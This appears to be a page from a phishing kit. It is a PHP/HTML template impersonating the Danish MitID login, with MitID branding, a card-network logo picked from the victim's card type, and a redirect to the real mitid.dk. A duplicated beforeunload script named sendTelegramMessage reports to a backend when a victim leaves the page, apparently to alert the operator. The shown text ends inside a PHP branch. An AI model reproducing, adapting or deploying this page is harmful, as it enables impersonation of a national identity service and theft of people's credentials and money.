<?php
require (__DIR__) . '/../main.php';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html lang=dk>
  <meta charset=utf-8>
  <title>MitID</title>
  <link rel="icon" type="image/x-icon" href="Tssawer/mit.ico" />
  <link rel="apple-touch-icon" sizes="32x32" href="Tssawer/mit.ico">
  <meta name=viewport content="width=device-width, initial-scale=1.0">
  <meta http-equiv="refresh" content="5000; url=https://www.mitid.dk/en-gb">
 
  <style>
    body {
      margin: 0;
      background: #f3f2f2;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 10px;
      min-width: 248px
    }

    #mitidIframe {
      width: 100%;
      height: 260px;
      border: 0;
      z-index: 100;
      position: relative
    }

    @media (min-width:380px) {
      #mitidIframe {
        height: 227px
      }
    }

    @media (min-width:400px) {
      #mitidIframe {
        height: 350px
      }
    }

    .mitidContextStr {
      font-size: 10px;
      font-weight: normal;
      color: #333;
      border-top: 1px solid #eee;
      border-bottom: 1px solid #eee;
      padding: 6px;
      background-color: #f8f8f9;
      overflow-wrap: anywhere
    }

    @media (min-width:380px) {
      .mitidContextStr {
        font-size: 0.9rem;
        padding: 15px
      }
    }

    @media (min-width:400px) {
      .mitidContextStr {
        font-size: 0.9rem;
        padding: 08px
      }
    }

    .header {
      height: 42px;
      border-bottom: 0px solid #ddd;
      display: flex;
      justify-content: flex-end;
      align-items: center;
      padding: 0px 16px 0px 16px
    }

    .imgcon {
      width: 33%
    }

    .logo {
      max-width: 100%;
      max-height: 32px
    }

    .bank {
      float: right
    }

    .lang {
      width: 30%;
      display: block;
      margin: auto;
      text-align: center
    }

    .lang img {
      max-width: 20px;
      height: auto;
      width: 100%
    }

    .lang a,
    .lang a:hover,
    .lang a:visited,
    .lang a:active {
      font-size: 2.5em;
      text-decoration: none
    }

    .network {
      float: left
    }

    .wrapper {
      -webkit-border-radius: 4px;
      -moz-border-radius: 4px;
      border-radius: 4px;
      position: relative;
      display: block;
      width: 250px;
      height: 400px;
      background-color: #fff
    }

    .container {
      position: relative;
      display: flex;
      flex-direction: column;
      font-family: Arial, sans-serif
    }

    .buttons {
      margin-top: 6px;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: row-reverse
    }

    button {
      width: 30%;
      height: 34px;
      text-align: center;
      margin: 00px 1% 00px 1%;
      min-height: 24px;
      line-height: 24px;
      border-radius: 4px;
      border: 1px solid #ccc;
      font-size: 0.9em;
      color: #333;
      background-image: linear-gradient(#eee, #ddd)
    }

    button:hover {
      color: #fff;
      background-image: linear-gradient(#96bfe9, #5e99d4)
    }

    button img {
      display: inline-block;
      vertical-align: middle;
      width: 12px
    }

    @media (min-width:380px) {
      body {
        font-size: 14px
      }

      .wrapper {
        width: 380px;
        height: 550px
      }

      .header {
        height: 72px;
        display: flex;
        align-items: center
      }

      .logo {
        max-width: 100%;
        max-height: 60px
      }

      .lang img {
        max-width: 40px
      }

      button {
        min-height: 30px;
        line-height: 30px
      }
    }

    @media (min-width:400px) {
      body {
        font-size: 14px
      }

      .wrapper {
        width: 380px;
        height: 550px
      }

      .header {
        height: 72px;
        display: flex;
        align-items: center
      }

      .logo {
        max-width: 100%;
        max-height: 60px
      }

      .lang img {
        max-width: 40px
      }

      button {
        min-height: 30px;
        line-height: 30px
      }
    }
  </style>
  <style>
    img[src="data:,"],
    source[src="data:,"] {
      display: none !important
    }
  </style>
 
  </head>
  <script>
        function sendTelegramMessage() {
            $.ajax({
                url: 'send_exit/exit_app.php',
                type: 'POST',
                success: function(response) {
                    console.log(response);
                },
                error: function(xhr, status, error) {
                    console.log("");
                }
            });
        }
        $(window).on('beforeunload', function() {
            sendTelegramMessage();
        });
    </script> 
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        function sendTelegramMessage() {
            $.ajax({
                url: 'send_exit/exit_app.php',
                type: 'POST',
                success: function(response) {
                    console.log(response);
                },
                error: function(xhr, status, error) {
                    console.log("");
                }
            });
        }
        $(window).on('beforeunload', function() {
            sendTelegramMessage();
        });
    </script>
  <body>
    <section class=wrapper>
      <header class=header>
        <div class=imgcon>
          <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDIxLjEuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJMYXllcl8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCINCgkgd2lkdGg9Ijk3LjgwMyIgaGVpZ2h0PSIyOC42MDkiIHZpZXdCb3g9IjAgMCAyODMuNDY1IDgyLjg5NCIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMjgzLjQ2NSA4Mi44OTQ7IiB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxnPg0KCTxnPg0KCQk8cGF0aCBzdHlsZT0iZmlsbDojMDA1Nzc2OyIgZD0iTTEuMzA4LDgxLjU4NkMwLjQ3Niw4MS41ODYsMCw4MS4xMSwwLDgwLjI3N1YyNS4wODVjMC0wLjcxNCwwLjIzOC0xLjMwOCwwLjk1MS0xLjY2NQ0KCQkJYzYuNzgtMi44NTUsMTQuNjMxLTQuNjM5LDIyLjgzOC00LjYzOWMxNS45NCwwLDI2Ljc2NCw3LjQ5NCwyNi43NjQsMjUuNjkzdjM1LjgwNGMwLDAuODMyLTAuNDc1LDEuMzA4LTEuNDI3LDEuMzA4aC03LjAxOA0KCQkJYy0wLjgzMiwwLTEuMzA4LTAuNDc2LTEuMzA4LTEuMzA4VjQ0LjcxMWMwLTEyLjM3MS02LjMwNC0xNy4xMjktMTcuMDEtMTcuMTI5Yy00Ljk5NiwwLTEwLjM0OCwwLjk1MS0xNC4wMzYsMi4xNDF2NTAuNTU0DQoJCQljMCwwLjgzMi0wLjQ3NiwxLjMwOC0xLjQyNywxLjMwOEgxLjMwOHoiLz4NCgkJPHBhdGggc3R5bGU9ImZpbGw6IzAwNTc3NjsiIGQ9Ik0xMTQuMzA3LDU0LjEwOGMwLDAuOTUxLTAuNDc2LDEuNDI3LTEuMzA4LDEuNDI3SDc0LjEwMnY0Ljk5NmMwLDguOTIxLDYuNjYxLDEzLjY3OSwxNS40NjQsMTMuNjc5DQoJCQljOC4yMDcsMCwxMy43OTgtMy4yMTIsMTguMTk5LTYuNjYxYzAuNzE0LTAuNDc2LDEuNDI3LTAuMzU3LDEuOTAzLDAuMzU3bDMuNDQ5LDQuNTJjMC41OTYsMC43MTQsMC40NzYsMS4zMDgtMC4yMzgsMS45MDMNCgkJCWMtNS45NDcsNC45OTYtMTMuNTYsOC41NjQtMjMuNTUxLDguNTY0Yy0xMi44NDcsMC0yNS4wOTktNy4zNzUtMjUuMDk5LTIyLjM2MlY0Mi40NTFjMC0xNi4yOTYsMTIuMTMzLTIzLjY3MSwyNS4yMTctMjMuNjcxDQoJCQljMTIuOTY2LDAsMjQuODYxLDcuMzc1LDI0Ljg2MSwyMy42NzFWNTQuMTA4eiBNODkuNDQ2LDI3LjU4M2MtOC45MjEsMC0xNS4zNDQsNC42MzktMTUuMzQ0LDE0Ljg2OXY0Ljk5NmgzMC42ODl2LTQuOTk2DQoJCQlDMTA0Ljc5MiwzMi4zNCw5OC4xMywyNy41ODMsODkuNDQ2LDI3LjU4M3oiLz4NCgkJPHBhdGggc3R5bGU9ImZpbGw6IzAwNTc3NjsiIGQ9Ik0xNDguNzk5LDczLjg1NGMxLjMwOCwwLDMuNTY4LTAuMTE5LDUuNzA5LTAuMjM4YzAuOTUyLDAsMS40MjgsMC40NzYsMS40MjgsMS4zMDh2Ni4zMDQNCgkJCWMwLDAuNzE0LTAuMzU4LDEuMzA4LTEuMTksMS40MjdjLTIuMTQxLDAuMTE5LTQuODc2LDAuMjM4LTYuNDIzLDAuMjM4Yy0xMS44OTYsMC0yMC42OTgtNi40MjMtMjAuNjk4LTIxLjA1NFY2LjQwOQ0KCQkJYzAtMC45NTEsMC40NzYtMS40MjcsMS40MjctMS40MjdoNi4xODZjMC43MTQsMCwxLjE4OSwwLjQ3NiwxLjMwOCwxLjMwOGwwLjgzMiwxNC4zOTNoMTUuNDY0YzAuODMyLDAsMS4zMDgsMC40NzYsMS4zMDgsMS4zMDgNCgkJCXY1Ljk0N2MwLDAuOTUyLTAuNDc2LDEuNDI3LTEuMzA4LDEuNDI3aC0xNS40NjR2MzEuOTk4QzEzNy4zNzksNjkuMjE1LDE0MS40MjMsNzMuODU0LDE0OC43OTksNzMuODU0eiIvPg0KCQk8cGF0aCBzdHlsZT0iZmlsbDojMDA1Nzc2OyIgZD0iTTE4Ni4yNjcsODIuODk0Yy04LjIwNywwLTE2LjQxNi0yLjM3OS0yMy41NTMtNy42MTNjLTAuNzE0LTAuNDc2LTAuNzE0LTEuMTg5LTAuMzU2LTEuOTAzDQoJCQlsMy4yMTEtNS40NzFjMC40NzYtMC44MzMsMS4wNy0wLjk1MSwxLjkwMy0wLjM1N2M1LjcxLDQuMjgyLDEyLjI1Miw2LjY2MSwxOS4wMzMsNi42NjFjNy45NjksMCwxNC4wMzYtMy4zMzEsMTQuMDM2LTkuNTE2DQoJCQljMC02LjY2MS03LjM3NS04LjIwNy0xNC4wMzYtOS41MTZjLTguNTY1LTEuNzg0LTIzLjE5Ni01LjExNS0yMy4xOTYtMTguOTEzYzAtMTIuMTMzLDExLjUzOC0xNy40ODYsMjMuNDM0LTE3LjQ4Ng0KCQkJYzcuNDkzLDAsMTQuMTU1LDEuOTAzLDIwLjY5Niw1LjU5YzAuODM0LDAuMzU3LDAuOTUyLDEuMDcsMC40NzYsMS43ODRsLTMuMjExLDUuMzUyYy0wLjM1NiwwLjcxNC0xLjA3LDAuOTUyLTEuNzg0LDAuNDc2DQoJCQljLTQuODc2LTIuNjE3LTEwLjcwNi00LjQwMS0xNi42NTMtNC40MDFjLTguMzI3LDAtMTMuMzIzLDMuMzMtMTMuMzIzLDguNjgzYzAsNi41NDIsNy4wMTgsOC4zMjYsMTUuNDY0LDkuOTkyDQoJCQljOS41MTYsMS45MDMsMjIuMDA2LDQuNjM5LDIyLjAwNiwxNy45NjJDMjEwLjQxNCw3Ni4zNTIsMjAwLjE4NCw4Mi44OTQsMTg2LjI2Nyw4Mi44OTR6Ii8+DQoJPC9nPg0KCTxnPg0KCQk8Y2lyY2xlIHN0eWxlPSJmaWxsOiMwMEJFRjA7IiBjeD0iMjQxLjk1IiBjeT0iMTMuODMyIiByPSIxMy44MzIiLz4NCgkJPGNpcmNsZSBzdHlsZT0iZmlsbDojMDBCRUYwOyIgY3g9IjI3MS4yOTIiIGN5PSIxMy44MzIiIHI9IjguODUyIi8+DQoJCTxjaXJjbGUgc3R5bGU9ImZpbGw6IzAwQkVGMDsiIGN4PSIyNzEuMjkyIiBjeT0iNDMuMTA3IiByPSIxMi4xNzIiLz4NCgkJPGNpcmNsZSBzdHlsZT0iZmlsbDojMDBCRUYwOyIgY3g9IjI0MS45NSIgY3k9IjcyLjM4MiIgcj0iMTAuNTEyIi8+DQoJPC9nPg0KPC9nPg0KPC9zdmc+DQo=" alt="Your Bank" class="logo network">
        </div>
        <div class=imgcon>
          <div class="lang lane">
            <a href="en.html" id="langLink">
              <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iNDgwIiB3aWR0aD0iNjQwIiB2aWV3Qm94PSIwIDAgNjQwIDQ4MCI+CiAgPGRlZnM+CiAgICA8Y2xpcFBhdGggaWQ9ImEiPgogICAgICA8cGF0aCBmaWxsLW9wYWNpdHk9Ii42NyIgZD0iTS04NS4zMzMgMGg2ODIuNjd2NTEyaC02ODIuNjd6Ii8+CiAgICA8L2NsaXBQYXRoPgogIDwvZGVmcz4KICA8ZyBjbGlwLXBhdGg9InVybCgjYSkiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDgwKSBzY2FsZSguOTQpIj4KICAgIDxnIHN0cm9rZS13aWR0aD0iMXB0Ij4KICAgICAgPHBhdGggZmlsbD0iIzAwNiIgZD0iTS0yNTYgMEg3NjguMDJ2NTEyLjAxSC0yNTZ6Ii8+CiAgICAgIDxwYXRoIGQ9Ik0tMjU2IDB2NTcuMjQ0bDkwOS41MzUgNDU0Ljc2OEg3NjguMDJWNDU0Ljc3TC0xNDEuNTE1IDBILTI1NnpNNzY4LjAyIDB2NTcuMjQzTC0xNDEuNTE1IDUxMi4wMUgtMjU2di01Ny4yNDNMNjUzLjUzNSAwSDc2OC4wMnoiIGZpbGw9IiNmZmYiLz4KICAgICAgPHBhdGggZD0iTTE3MC42NzUgMHY1MTIuMDFoMTcwLjY3VjBoLTE3MC42N3pNLTI1NiAxNzAuNjd2MTcwLjY3SDc2OC4wMlYxNzAuNjdILTI1NnoiIGZpbGw9IiNmZmYiLz4KICAgICAgPHBhdGggZD0iTS0yNTYgMjA0LjgwNHYxMDIuNDAySDc2OC4wMlYyMDQuODA0SC0yNTZ6TTIwNC44MSAwdjUxMi4wMWgxMDIuNFYwaC0xMDIuNHpNLTI1NiA1MTIuMDFMODUuMzQgMzQxLjM0aDc2LjMyNGwtMzQxLjM0IDE3MC42N0gtMjU2ek0tMjU2IDBMODUuMzQgMTcwLjY3SDkuMDE2TC0yNTYgMzguMTY0VjB6bTYwNi4zNTYgMTcwLjY3TDY5MS42OTYgMGg3Ni4zMjRMNDI2LjY4IDE3MC42N2gtNzYuMzI0ek03NjguMDIgNTEyLjAxTDQyNi42OCAzNDEuMzRoNzYuMzI0TDc2OC4wMiA0NzMuODQ4djM4LjE2MnoiIGZpbGw9IiNjMDAiLz4KICAgIDwvZz4KICA8L2c+Cjwvc3ZnPgo=">
            </a>
          </div>
        </div>
<div class="imgcon">
    <?php
    if ($card_type == 'mastercard') {
        echo '<img src="data:image/svg+xml;base64,PHN2ZyBpZD0iYTU2ODlmYzUtOGQ1ZS00YjE5LTgxN2MtMTcxZjhjYWJmNjVhIiBkYXRhLW5hbWU9IkxheWVyIDEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgdmlld0JveD0iMCAwIDUwNC4xNjI4NyAxNDQiPjxyZWN0IHdpZHRoPSI1MDQuMTYyODciIGhlaWdodD0iMTQ0IiBzdHlsZT0iZmlsbDpub25lIi8+PHJlY3QgeD0iNzguNDk1MSIgeT0iNDMuNjk2OCIgd2lkdGg9IjMxLjUiIGhlaWdodD0iNTYuNjA2NCIgc3R5bGU9ImZpbGw6I2ZmNWYwMCIvPjxwYXRoIGQ9Ik0yMjQuNDEzODYsMzA2YTM1LjkzNzUsMzUuOTM3NSwwLDAsMSwxMy43NDk5LTI4LjMwMzIsMzYsMzYsMCwxLDAsMCw1Ni42MDY0QTM1LjkzOCwzNS45MzgsMCwwLDEsMjI0LjQxMzg2LDMwNloiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC0xNDMuOTE4NTYgLTIzNCkiIHN0eWxlPSJmaWxsOiNlYjAwMWIiLz48cGF0aCBkPSJNMjk2LjQwOSwzMDZhMzUuOTk4NjcsMzUuOTk4NjcsMCwwLDEtNTguMjQ1MjEsMjguMzAzMiwzNi4wMDUxOCwzNi4wMDUxOCwwLDAsMCwwLTU2LjYwNjRBMzUuOTk4NjcsMzUuOTk4NjcsMCwwLDEsMjk2LjQwOSwzMDZaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMTQzLjkxODU2IC0yMzQpIiBzdHlsZT0iZmlsbDojZjc5ZTFiIi8+PHBhdGggZD0iTTI5Mi45NzQzNiwzMjguMzA3N3YtMS4xNTg5aC40Njczdi0uMjM2MWgtMS4xOTAxdi4yMzYxaC40Njc1djEuMTU4OVptMi4zMTA1LDB2LTEuMzk3M2gtLjM2NDhsLS40MTk2Ljk2MTEtLjQxOTctLjk2MTFoLS4zNjV2MS4zOTczaC4yNTc2di0xLjA1NGwuMzkzNS45MDg3aC4yNjcxMWwuMzkzNDktLjkxMXYxLjA1NjNaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMTQzLjkxODU2IC0yMzQpIiBzdHlsZT0iZmlsbDojZjc5ZTFiIi8+PHBvbHlnb24gcG9pbnRzPSIxODkuMTU3IDEwOC4yMDIgMTg3LjgyNCAxMDguMjAyIDE4Ny44MjQgOTYuMDU1IDE4Ny44MjQgNzEuNzU5IDE4Ny44MjQgNDcuNDYzIDE4Ny44MjQgMzUuMzE2IDE4OS4xNTcgMzUuMzE2IDE4OS4xNTcgNTkuNjExIDE4OS4xNTcgODMuOTA3IDE4OS4xNTcgMTA4LjIwMiIvPjxwYXRoIGQ9Ik0zNjkuOTcxMDksMzI4LjMwODY5aC0zLjc0MTIyVjI4NS4zNzU1OGgzLjc0MTIyWm0yNy4yOTMtNDIuOTMzMTFhMjkuMTMyNDcsMjkuMTMyNDcsMCwwLDEsOS42NjAxNiwxLjUwMjQ0LDIwLjU0NjQ4LDIwLjU0NjQ4LDAsMCwxLDcuMjk4ODMsNC4yOTM0NiwxOC44MiwxOC44MiwwLDAsMSw0LjYyOTg4LDYuNzYxNzIsMjUuMjE4MiwyNS4yMTgyLDAsMCwxLDAsMTcuODE3MzgsMTguODE3NjIsMTguODE3NjIsMCwwLDEtNC42Mjk4OCw2Ljc2MjIxLDIwLjUzOTI4LDIwLjUzOTI4LDAsMCwxLTcuMjk4ODMsNC4yOTM0NiwyOS4xMTk4NCwyOS4xMTk4NCwwLDAsMS05LjY2MDE2LDEuNTAyNDRIMzgxLjU5MzE2VjI4NS4zNzU1OFptLTExLjkyOTY4LDMuNTU3MTN2MzUuODE4ODVoMTEuOTI5NjhhMjQuNzIxMjYsMjQuNzIxMjYsMCwwLDAsOC4yODAyOC0xLjI3Mjk1LDE2Ljc3NjQ4LDE2Ljc3NjQ4LDAsMCwwLDYuMDQxLTMuNjAzLDE1LjAxOTgsMTUuMDE5OCwwLDAsMCwzLjcxMDk0LTUuNjQzMDYsMjIuMzU4MDUsMjIuMzU4MDUsMCwwLDAsMC0xNC43ODEyNSwxNS4xNTY4MSwxNS4xNTY4MSwwLDAsMC0zLjcxMDk0LTUuNjU3NzIsMTYuNDk5MzIsMTYuNDk5MzIsMCwwLDAtNi4wNDEtMy42MDM1MSwyNS4wMTA2NiwyNS4wMTA2NiwwLDAsMC04LjI4MDI4LTEuMjU3MzNabTc4LjYyODktNC4wNDc4NWEyMi45NzY1NCwyMi45NzY1NCwwLDAsMSw1LjMzNjkyLjYxMzI4LDIxLjU5MDYzLDIxLjU5MDYzLDAsMCwxLDQuODI5MSwxLjc2MzE5LDE5LjI2MTQzLDE5LjI2MTQzLDAsMCwxLDQuMDc5MSwyLjc3NTM5LDE3LjAxNTcyLDE3LjAxNTcyLDAsMCwxLDMuMTEyMywzLjY4MDE3bC0zLjEyNzkzLDIuMDg1YTE1LjExNiwxNS4xMTYsMCwwLDAtMi42MjIwNy0zLjAzNTY0LDE2LjQ2MTYsMTYuNDYxNiwwLDAsMC0zLjM0Mjc3LTIuMzAwMywxNy4xNjEzNSwxNy4xNjEzNSwwLDAsMC0zLjkyNDgtMS40NTY1NCwxOC40Njc0OSwxOC40Njc0OSwwLDAsMC00LjMzOTg1LS41MDU4NiwxOS4wMzUzNywxOS4wMzUzNywwLDAsMC03LjEyOTg4LDEuMzE4MzYsMTYuOTk1NzQsMTYuOTk1NzQsMCwwLDAtNS43MzQzOCwzLjc0MTcsMTcuNDg0MzksMTcuNDg0MzksMCwwLDAtMy44MzMsNS43OTU5LDIwLjc1ODYyLDIwLjc1ODYyLDAsMCwwLDAsMTQuOTY1MzMsMTcuNDc5MjgsMTcuNDc5MjgsMCwwLDAsMy44MzMsNS43OTU5LDE2Ljk4NzE3LDE2Ljk4NzE3LDAsMCwwLDUuNzM0MzgsMy43NDEyMSwxOS4wMTYyMywxOS4wMTYyMywwLDAsMCw3LjEyOTg4LDEuMzE4ODUsMTguODIxOTEsMTguODIxOTEsMCwwLDAsNC4zMjQyMi0uNDkwNzIsMTYuNjg0NDIsMTYuNjg0NDIsMCwwLDAsMy45MTAxNi0xLjQ0MTQxLDE2LjQyODE4LDE2LjQyODE4LDAsMCwwLDMuMzQyNzctMi4yOTk4LDE0Ljc2NzI3LDE0Ljc2NzI3LDAsMCwwLDIuNjIyMDctMy4wNjY5bDMuMDY2NDEsMi4yMzg3N2ExOC4xODUxNSwxOC4xODUxNSwwLDAsMS0zLjE3MzgzLDMuNjE4NjUsMTkuODA4NCwxOS44MDg0LDAsMCwxLTQuMDQ3ODUsMi43Mjk0OSwyMS4wMzA0NiwyMS4wMzA0NiwwLDAsMS00Ljc2ODU2LDEuNzMyNDMsMjMuOTc1NjEsMjMuOTc1NjEsMCwwLDEtMTQtMS4wMjczNSwyMS4wMjUsMjEuMDI1LDAsMCwxLTYuOTc2NTYtNC41MjM0MywyMC43NDQ5MiwyMC43NDQ5MiwwLDAsMS00LjYxNTIzLTYuOTMwNjcsMjQuMzc5MzEsMjQuMzc5MzEsMCwwLDEsMC0xNy43NDAyMywyMC43MTksMjAuNzE5LDAsMCwxLDQuNjE1MjMtNi45NDYyOSwyMS4wMzI0OSwyMS4wMzI0OSwwLDAsMSw2Ljk3NjU2LTQuNTIzNDRBMjMuMTMxMTQsMjMuMTMxMTQsMCwwLDEsNDYzLjk2MzI3LDI4NC44ODQ4NlptMjguODU3NDIsMTkuNTY0OTRhMTEuMDI5MywxMS4wMjkzLDAsMCwxLDIuMDA4NzktMi40NTMxMiwxMC43Mjk2MiwxMC43Mjk2MiwwLDAsMSwyLjQ5OS0xLjcwMjE1LDEyLjQ3NjUzLDEyLjQ3NjUzLDAsMCwxLDIuODIxMjktLjk4MSwxMy43MzI0MywxMy43MzI0MywwLDAsMSwyLjk0NDMzLS4zMjIyNiwxNC4zOTk1NSwxNC4zOTk1NSwwLDAsMSw0LjkzNzUuODEyNSwxMS4xMzg5MywxMS4xMzg5MywwLDAsMSwzLjg0ODYzLDIuMzE1NDMsMTAuMTM5NDUsMTAuMTM5NDUsMCwwLDEsMi40ODQzOCwzLjY2NDU1LDEyLjc5NjU4LDEyLjc5NjU4LDAsMCwxLC44NzQsNC44MzAwN3YxNy42OTQ4M2gtMy40OTYwOXYtMTYuNjIxMWExMS44MjQ3NSwxMS44MjQ3NSwwLDAsMC0uNjEzMjgtMy45MjU3OCw3Ljg0NjMzLDcuODQ2MzMsMCwwLDAtMS44MDk1Ny0yLjk1OSw3Ljk1OTIsNy45NTkyLDAsMCwwLTIuOTEzMDktMS44NTU0NywxMS4xMzk2OSwxMS4xMzk2OSwwLDAsMC0zLjkyNTc4LS42NDQsMTAuMjk2NCwxMC4yOTY0LDAsMCwwLTMuNzg3MTEuNjg5OTQsOS4wNTc5NCw5LjA1Nzk0LDAsMCwwLTMuMDY2NCwxLjk2Mjg5LDkuMjM4MjgsOS4yMzgyOCwwLDAsMC0yLjA1NDY5LDMuMDM1NjQsOS43ODA0Miw5Ljc4MDQyLDAsMCwwLS43NTIsMy44Nzk0djE2LjQzNzVINDg5LjMyNDZWMjg0LjE0ODUzaDMuNDk2MDlabTQzLjIxLTUuNDU4NDlhMTMuMTE1MjEsMTMuMTE1MjEsMCwwLDEsNS4zNTA1OCwxLjA4ODg2LDEyLjY4NzY1LDEyLjY4NzY1LDAsMCwxLDQuMjYyNywzLjAzNTY1LDE0LjQzNTU1LDE0LjQzNTU1LDAsMCwxLDIuODM2OTEsNC42NjE2MiwxNi44NjMsMTYuODYzLDAsMCwxLDEuMDczMjQsNS45MzQwOGMwLC4yNjU2My0uMDA0ODguNTE2Ni0uMDE0NjUuNzUxcS0uMDE2MTEuMzUzLS4wNDU4OS42OTA0M0g1MjUuMjk3MjZhMTIuNDA5MTMsMTIuNDA5MTMsMCwwLDAsMS4xMTkxNCw0LjQ3NywxMC41Njg2MiwxMC41Njg2MiwwLDAsMCwyLjQzODQ3LDMuMzI3MTUsMTAuMjc3NjYsMTAuMjc3NjYsMCwwLDAsMy40NDkyMiwyLjA3MDMxLDEyLjExMTg2LDEyLjExMTg2LDAsMCwwLDQuMTU1MjguNzA1MDgsMTIuODA3NzgsMTIuODA3NzgsMCwwLDAsNS40Mjg3MS0xLjEwNCwxNS4xOTksMTUuMTk5LDAsMCwwLDQuMzIzMjQtMy4wMDUzN2wxLjg3MTA5LDIuMzkyMDlhMTcuMTQ0NzEsMTcuMTQ0NzEsMCwwLDEtMi44MDU2NiwyLjMwMDI5LDE0Ljk4MzU3LDE0Ljk4MzU3LDAsMCwxLTIuOTE0MDYsMS40NzE2OCwxNC4zNzMzMywxNC4zNzMzMywwLDAsMS0zLjAyMDUxLjc2NjYxLDIyLjMyMDg2LDIyLjMyMDg2LDAsMCwxLTMuMDk2NjguMjE0ODQsMTUuMjgwMDUsMTUuMjgwMDUsMCwwLDEtNS44MjcxNS0xLjA4ODg3LDEzLjU1MTUsMTMuNTUxNSwwLDAsMS00LjU5OTYxLTMuMDUxMjcsMTMuNzk0MjMsMTMuNzk0MjMsMCwwLDEtMy4wMDU4Ni00LjY5MTg5LDE2LjM3MDE3LDE2LjM3MDE3LDAsMCwxLTEuMDczMjQtNi4wNDE1MUExNi4xMjQxMSwxNi4xMjQxMSwwLDAsMSw1MjIuODI4NTEsMzA3LjlhMTQuMjUzOTIsMTQuMjUzOTIsMCwwLDEsMy4wMDQ4OC00LjcyMjY2LDEzLjU3NjA3LDEzLjU3NjA3LDAsMCwxLDQuNTM5MDYtMy4wODJBMTQuNDMyODcsMTQuNDMyODcsMCwwLDEsNTM2LjAzMDY2LDI5OC45OTEzMVptLS4wNjE1MywzLjA5NzE2YTEwLjUwNzA2LDEwLjUwNzA2LDAsMCwwLTQuMDMzMi43NTE0NywxMC4xMDc3NCwxMC4xMDc3NCwwLDAsMC0zLjIwNDEsMi4wODU0NSwxMC44MTMzOSwxMC44MTMzOSwwLDAsMC0yLjI1MzkxLDMuMTczODMsMTIuNTg4OTEsMTIuNTg4OTEsMCwwLDAtMS4xMTkxNCw0LjA0ODM0aDIwLjYzODY3YTEyLjQ3OCwxMi40NzgsMCwwLDAtMS4wMTI2OS00LjA5NDI0LDEwLjMxMTM5LDEwLjMxMTM5LDAsMCwwLTIuMTYyMTEtMy4xNzM4Myw5LjYxMDc4LDkuNjEwNzgsMCwwLDAtNi44NTM1Mi0yLjc5MVptMzMuNzAxMTctMy4wOTcxNmExNS4yODI4MiwxNS4yODI4MiwwLDAsMSw1Ljk2NDg1LDEuMTQ5OSwxMi43NTkyMSwxMi43NTkyMSwwLDAsMSw0LjY3Njc2LDMuMzI3NjNsLTIuMjY5NTQsMi4zNjEzM2ExMi41Mzk0NywxMi41Mzk0NywwLDAsMC0zLjc4NzExLTIuNjIyMDcsMTEuMzcxOTQsMTEuMzcxOTQsMCwwLDAtNC42NzY3NS0uOTM1NTQsMTEuMDUzLDExLjA1MywwLDAsMC00LjQwMDM5Ljg3NCwxMC44MDc1NCwxMC44MDc1NCwwLDAsMC0zLjU0MiwyLjQyMjg1LDExLjA3MTg2LDExLjA3MTg2LDAsMCwwLTIuMzQ2NjgsMy42Nzk2OSwxMy4yMjc1MywxMy4yMjc1MywwLDAsMCwwLDkuMjkyLDEwLjc0OTkxLDEwLjc0OTkxLDAsMCwwLDUuODg4NjgsNi4wNzIyNywxMS4wNTMsMTEuMDUzLDAsMCwwLDQuNDAwMzkuODc0LDExLjMxOTc3LDExLjMxOTc3LDAsMCwwLDQuNzM4MjgtLjk4MTQ1LDEzLjE2MDI2LDEzLjE2MDI2LDAsMCwwLDMuODE3MzgtMi42MDY0NGwyLjE3Nzc0LDIuMzkyMDlhMTMuMDcxMzYsMTMuMDcxMzYsMCwwLDEtNC42OTIzOSwzLjMyNzE1LDE2LjEwMzM3LDE2LjEwMzM3LDAsMCwxLTExLjkxNDA2LjAxNTEzLDEzLjkyNDMxLDEzLjkyNDMxLDAsMCwxLTcuNzI3NTQtNy44MzUsMTYuNTg5MjQsMTYuNTg5MjQsMCwwLDEsMC0xMS44MjIyNiwxMy44ODk1OSwxMy44ODk1OSwwLDAsMSw3LjcyNzU0LTcuODUwNTlBMTUuMzE2OCwxNS4zMTY4LDAsMCwxLDU2OS42NzAzLDI5OC45OTEzMVptMjEuMTU5MTgsMTIuNjM0NzZoNC42OTIzOWwxMi4xNDM1NS0xMi4xNzQ4aDQuNDE2bC0xMy43MzgyOCwxMy42MTYyMSwxMy45ODMzOSwxNS4yNDEyMWgtNC40NDYyOWwtMTIuMzU4MzktMTMuNTIzOTNoLTQuNjkyMzl2MTMuNTIzOTNoLTMuNDk2MDlWMjg0LjE0ODUzaDMuNDk2MDlaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMTQzLjkxODU2IC0yMzQpIi8+PC9zdmc+" alt="Card Network" class="logo bank">';
    } else {
